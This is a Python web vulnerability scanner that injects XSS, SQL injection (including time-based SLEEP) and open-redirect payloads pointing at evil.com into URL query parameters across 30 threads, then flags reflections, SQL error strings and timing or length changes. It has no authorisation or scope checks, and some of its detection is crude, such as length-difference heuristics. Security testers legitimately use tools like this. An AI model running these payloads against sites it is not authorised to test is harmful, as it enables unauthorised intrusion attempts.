import requests
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
import time


HEADERS = {
    "User-Agent": "Mozilla/5.0"
}

def safe_request(url, timeout=5):
    for _ in range(2):
        try:
            return requests.get(url, timeout=timeout, headers=HEADERS)
        except:
            continue
    return None

# =========================
# PAYLOADS
# =========================

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>"
]

REDIRECT_PAYLOAD = "https://evil.com"

# =========================
# HELPER
# =========================

def inject_payload(url, param, payload):
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)

    query[param] = [payload]

    new_query = urllib.parse.urlencode(query, doseq=True)

    new_url = parsed._replace(query=new_query).geturl()

    return new_url



# =========================
# OPEN REDIRECT TEST
# =========================

def test_open_redirect(url):
    findings = []

    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)

    if not params:
        return findings

    for param in params:
        test_url = inject_payload(url, param, REDIRECT_PAYLOAD)

        try:
            res = requests.get(
                test_url,
                allow_redirects=False,
                timeout=5,
                headers=HEADERS
            )
        except:
            res = safe_request(test_url, timeout=5)

        if not res:
            continue

        location = res.headers.get("Location", "")

        if REDIRECT_PAYLOAD in location:
            findings.append({
                "type": "Open Redirect",
                "url": test_url,
                "param": param,
                "severity": "Medium"
            })

    return findings

# =========================
# SQL INJECTION TEST (REAL)
# =========================

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 'a'='a"
]

def test_sqli(url):
    findings = []

    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)

    if not params:
        return findings
    try:
        res = safe_request(url, timeout=5)
        if not res:
            return []
        baseline = res.text
    except:
        return []

    for param in params:
        for payload in SQLI_PAYLOADS:
            test_url = inject_payload(url, param, payload)

            try:
                res = safe_request(test_url, timeout=5)
                if not res:
                    continue

                # 🔥 REAL DETECTION
                SQL_ERRORS = [
                    "sql syntax",
                    "mysql_fetch",
                    "ora-01756",
                    "sqlite error",
                    "unclosed quotation mark",
                    "quoted string not properly terminated"
                ]

                if any(err in res.text.lower() for err in SQL_ERRORS) or abs(len(res.text) - len(baseline)) > 100:
                    findings.append({
                        "type": "SQL Injection",
                        "url": test_url,
                        "param": param,
                        "severity": "High"
                    })

            except:
                pass

    return findings

def test_time_sqli(url):
    import time

    findings = []

    TIME_BASED_PAYLOAD = "' OR SLEEP(5)--"

    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)

    if not params:
        return findings
    for param in params:
        test_url = inject_payload(url, param, TIME_BASED_PAYLOAD)

        try:
            start = time.time()
            res = safe_request(test_url, timeout=10)
            if not res:
                continue
            end = time.time()

            if 4 < (end - start) < 10:
                findings.append({
                    "type": "Potential SQLi Candidate",
                    "url": test_url,
                    "param": param,
                    "severity": "Medium"
                })

        except:
            pass

    return findings

# =========================
# IMPROVED XSS (REAL CHECK)
# =========================

def test_xss_real(url):
    findings = []

    payload = "<script>alert(1)</script>"

    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)

    if not params:
        return findings

    try:
        res = safe_request(url, timeout=5)
        if not res:
            return []
        baseline = res.text
    except:
        return []

    for param in params:
        test_url = inject_payload(url, param, payload)

        try:
            res = safe_request(test_url, timeout=5)
            if not res:
                continue

            if payload in res.text and res.text != baseline:
                findings.append({
                    "type": "Reflected XSS",
                    "url": test_url,
                    "param": param,
                    "severity": "High"
                })

        except:
            pass

    return findings

# =========================
# MAIN ENGINE
# =========================

def run_vuln_scan(urls):
    print("\n[+] Running Vulnerability Engine...\n")

    all_findings = []

    priority_params = ["id", "user", "account", "token", "redirect", "url"]
    
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = []

        for url in urls:
            if not any(p in url.lower() for p in priority_params):
                continue
            parsed = urllib.parse.urlparse(url)

            # Skip static files
            if any(parsed.path.endswith(ext) for ext in [".js", ".css", ".png", ".jpg", ".svg"]):
                continue

            # Skip useless params
            bad_params = ["lang", "theme", "utm_", "ref"]
            params = urllib.parse.parse_qs(parsed.query)

            if not params:
                continue

            if all(any(bp in p for bp in bad_params) for p in params):
                continue

            futures.append(executor.submit(test_xss_real, url))  
            futures.append(executor.submit(test_open_redirect, url))
            futures.append(executor.submit(test_sqli, url))          
            futures.append(executor.submit(test_time_sqli, url))     

        for future in as_completed(futures):
            time.sleep(0.05)   # 🔥 ADD THIS LINE (RATE LIMIT)
            try:
                result = future.result()
            except:
                continue

            if result:
                all_findings.extend(result)

    unique = list({(f["type"], f["url"], f.get("param")): f for f in all_findings}.values())

    print(f"[+] Found {len(unique)} unique potential vulnerabilities")

    for v in unique:
        print(f"[VULN] {v}")

    return unique

